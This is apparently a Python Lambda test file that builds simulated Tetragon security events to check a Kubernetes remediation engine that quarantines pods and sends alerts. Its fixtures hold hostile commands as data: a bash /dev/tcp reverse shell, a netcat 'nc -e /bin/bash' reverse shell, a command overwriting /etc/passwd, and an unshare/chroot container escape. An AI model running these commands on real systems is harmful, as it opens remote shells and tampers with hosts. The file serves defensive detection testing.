# Test Lambda for Remediation Pipeline Validation
# Simulates various Tetragon events to test the enforcement engine

import json
import boto3
import logging
from datetime import datetime, timezone
from tetragon_event_schema import (
    EXAMPLE_PROCESS_EXEC_EVENT,
    EXAMPLE_FILE_ACCESS_EVENT,
    EXAMPLE_NETWORK_EVENT
)

logger = logging.getLogger(__name__)
lambda_client = boto3.client('lambda')

def create_test_event(event_type: str, kisumu_region: bool = False) -> dict:
    """Create a test event for various scenarios"""

    base_timestamp = datetime.now(timezone.utc).isoformat()

    if event_type == "malicious_process_exec":
        return {
            "process_exec_id": f"test-{event_type}-{int(datetime.now().timestamp())}",
            "node_name": "eks-security-node-kisumu-001" if kisumu_region else "eks-security-node-12345",
            "time": base_timestamp,
            "event_type": "PROCESS_EXEC",
            "process": {
                "exec_id": "test-malicious-process",
                "pid": 31337,
                "uid": 0,
                "cwd": "/tmp",
                "binary": "/usr/bin/bash",
                "arguments": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "flags": "execve",
                "start_time": base_timestamp,
                "auid": 4294967295
            },
            "parent": {
                "exec_id": "parent-process",
                "pid": 1,
                "uid": 0,
                "binary": "/usr/local/bin/entrypoint",
                "arguments": "/usr/local/bin/entrypoint webapp",
                "start_time": base_timestamp
            },
            "kubernetes": {
                "namespace": "production",
                "pod_name": "compromised-pod-test-123",
                "container_name": "webapp",
                "pod_labels": {
                    "app": "webapp",
                    "version": "v1.0"
                },
                "workload_kind": "Deployment",
                "workload_name": "webapp-deployment"
            },
            "node_info": {
                "vpc_id": "vpc-kisumu123" if kisumu_region else "vpc-standard123",
                "subnet_id": "subnet-lakevictoria456" if kisumu_region else "subnet-standard456",
                "private_ip": "10.100.1.50" if kisumu_region else "10.0.1.50",
                "region": "af-south-1",
                "availability_zone": "af-south-1a"
            },
            "policy_name": "process-execution-enforcement",
            "severity": "critical",
            "action": "sigkill"
        }

    elif event_type == "unauthorized_file_access":
        return {
            "process_exec_id": f"test-{event_type}-{int(datetime.now().timestamp())}",
            "node_name": "eks-security-node-kisumu-002" if kisumu_region else "eks-security-node-67890",
            "time": base_timestamp,
            "event_type": "FILE",
            "process": {
                "exec_id": "test-file-access",
                "pid": 12345,
                "uid": 1000,
                "cwd": "/app",
                "binary": "/bin/bash",
                "arguments": "bash -c 'echo backdoor > /etc/passwd'",
                "start_time": base_timestamp
            },
            "file": {
                "path": "/etc/passwd",
                "flags": ["O_WRONLY", "O_CREAT", "O_TRUNC"],
                "permission": "write",
                "mode": 644,
                "uid": 0,
                "gid": 0
            },
            "kubernetes": {
                "namespace": "default",
                "pod_name": "malicious-pod-test-456",
                "container_name": "attacker"
            },
            "node_info": {
                "vpc_id": "vpc-kisumu123" if kisumu_region else "vpc-standard123",
                "subnet_id": "subnet-lakevictoria456" if kisumu_region else "subnet-standard456",
                "private_ip": "10.100.2.30" if kisumu_region else "10.0.2.30",
                "region": "af-south-1",
                "availability_zone": "af-south-1b"
            },
            "policy_name": "file-integrity-monitoring",
            "severity": "critical",
            "action": "deny"
        }

    elif event_type == "suspicious_network_connection":
        return {
            "process_exec_id": f"test-{event_type}-{int(datetime.now().timestamp())}",
            "node_name": "eks-security-node-kisumu-003" if kisumu_region else "eks-security-node-99999",
            "time": base_timestamp,
            "event_type": "NETWORK",
            "process": {
                "exec_id": "test-network-event",
                "pid": 54321,
                "uid": 1001,
                "binary": "/usr/bin/nc",
                "arguments": "nc -e /bin/bash 192.168.1.100 31337"
            },
            "network": {
                "protocol": "TCP",
                "family": "AF_INET",
                "src_ip": "10.100.3.40" if kisumu_region else "10.0.3.40",
                "src_port": 45678,
                "dst_ip": "192.168.1.100",
                "dst_port": 31337,
                "state": "SYN_SENT",
                "direction": "egress"
            },
            "kubernetes": {
                "namespace": "staging",
                "pod_name": "backdoor-pod-test-789",
                "container_name": "reverse-shell"
            },
            "node_info": {
                "vpc_id": "vpc-kisumu123" if kisumu_region else "vpc-standard123",
                "subnet_id": "subnet-lakevictoria456" if kisumu_region else "subnet-standard456",
                "private_ip": "10.100.3.40" if kisumu_region else "10.0.3.40",
                "region": "af-south-1",
                "availability_zone": "af-south-1c"
            },
            "policy_name": "regional-vpc-enforcement" if kisumu_region else "network-drift-enforcement",
            "severity": "critical",
            "action": "deny"
        }

    elif event_type == "container_escape_attempt":
        return {
            "process_exec_id": f"test-{event_type}-{int(datetime.now().timestamp())}",
            "node_name": "eks-security-node-kisumu-004" if kisumu_region else "eks-security-node-11111",
            "time": base_timestamp,
            "event_type": "PROCESS_KPROBE",
            "process": {
                "exec_id": "test-container-escape",
                "pid": 66666,
                "uid": 0,
                "cwd": "/",
                "binary": "/usr/bin/unshare",
                "arguments": "unshare -p -f --mount-proc chroot /host /bin/bash",
                "start_time": base_timestamp
            },
            "kprobe": {
                "function_name": "sys_unshare",
                "args": {
                    "flags": "0x20000000"  # CLONE_NEWPID
                },
                "return_action": "sigkill"
            },
            "kubernetes": {
                "namespace": "kube-system",
                "pod_name": "privileged-pod-test-000",
                "container_name": "escape-attempt"
            },
            "node_info": {
                "vpc_id": "vpc-kisumu123" if kisumu_region else "vpc-standard123",
                "subnet_id": "subnet-lakevictoria456" if kisumu_region else "subnet-standard456",
                "private_ip": "10.100.4.50" if kisumu_region else "10.0.4.50",
                "region": "af-south-1",
                "availability_zone": "af-south-1a"
            },
            "policy_name": "container-escape-detection",
            "severity": "critical",
            "action": "sigkill"
        }

    else:
        raise ValueError(f"Unknown event type: {event_type}")

def lambda_handler(event, context):
    """Test various remediation scenarios"""

    # Extract test parameters
    test_type = event.get('test_type', 'all')
    kisumu_region = event.get('kisumu_region', False)
    main_lambda_name = event.get('main_lambda_name', 'security-drift-engine-drift-enforcement')

    results = []

    test_scenarios = [
        "malicious_process_exec",
        "unauthorized_file_access",
        "suspicious_network_connection",
        "container_escape_attempt"
    ]

    if test_type != 'all':
        test_scenarios = [test_type]

    logger.info(f"Running tests: {test_scenarios}, Kisumu region: {kisumu_region}")

    for scenario in test_scenarios:
        try:
            # Create test event
            test_event = create_test_event(scenario, kisumu_region)

            # Create Lambda event payload (simulating CloudWatch Logs)
            lambda_payload = {
                "Records": [
                    {
                        "kinesis": {
                            "data": encode_log_event(test_event)
                        }
                    }
                ]
            }

            # Invoke main Lambda function
            response = lambda_client.invoke(
                FunctionName=main_lambda_name,
                InvocationType='RequestResponse',
                Payload=json.dumps(lambda_payload)
            )

            # Parse response
            response_payload = json.loads(response['Payload'].read().decode('utf-8'))

            result = {
                "scenario": scenario,
                "kisumu_region": kisumu_region,
                "status": "success" if response['StatusCode'] == 200 else "failed",
                "response": response_payload,
                "test_timestamp": datetime.now(timezone.utc).isoformat()
            }

            logger.info(f"Test {scenario} completed: {result['status']}")

        except Exception as e:
            result = {
                "scenario": scenario,
                "kisumu_region": kisumu_region,
                "status": "error",
                "error": str(e),
                "test_timestamp": datetime.now(timezone.utc).isoformat()
            }
            logger.error(f"Test {scenario} failed: {e}")

        results.append(result)

    # Summary
    successful_tests = len([r for r in results if r['status'] == 'success'])
    total_tests = len(results)

    return {
        'statusCode': 200,
        'body': json.dumps({
            'test_summary': {
                'total_tests': total_tests,
                'successful': successful_tests,
                'failed': total_tests - successful_tests,
                'success_rate': f"{(successful_tests/total_tests)*100:.1f}%"
            },
            'test_results': results,
            'test_configuration': {
                'test_type': test_type,
                'kisumu_region': kisumu_region,
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        }, indent=2)
    }

def encode_log_event(event_data: dict) -> str:
    """Encode test event as CloudWatch Logs would"""
    import base64
    import gzip

    # Create CloudWatch Logs format
    log_data = {
        "messageType": "DATA_MESSAGE",
        "owner": "123456789012",
        "logGroup": "/aws/security/drift-engine/high-severity",
        "logStream": "test-stream",
        "subscriptionFilters": ["test-filter"],
        "logEvents": [
            {
                "id": f"test-{int(datetime.now().timestamp())}",
                "timestamp": int(datetime.now().timestamp() * 1000),
                "message": json.dumps(event_data)
            }
        ]
    }

    # Compress and encode
    compressed = gzip.compress(json.dumps(log_data).encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')

    return encoded

# Test scenarios documentation
TEST_SCENARIOS = {
    "malicious_process_exec": {
        "description": "Simulates execution of blacklisted processes (bash reverse shell)",
        "expected_actions": ["pod_quarantined", "alert_sent"],
        "severity": "critical"
    },
    "unauthorized_file_access": {
        "description": "Simulates unauthorized modification of /etc/passwd",
        "expected_actions": ["pod_quarantined", "critical_file_access", "alert_sent"],
        "severity": "critical"
    },
    "suspicious_network_connection": {
        "description": "Simulates connection to suspicious port (31337)",
        "expected_actions": ["pod_quarantined", "suspicious_network_connection", "alert_sent"],
        "severity": "critical"
    },
    "container_escape_attempt": {
        "description": "Simulates container escape via unshare syscall",
        "expected_actions": ["pod_quarantined", "alert_sent"],
        "severity": "critical"
    }
}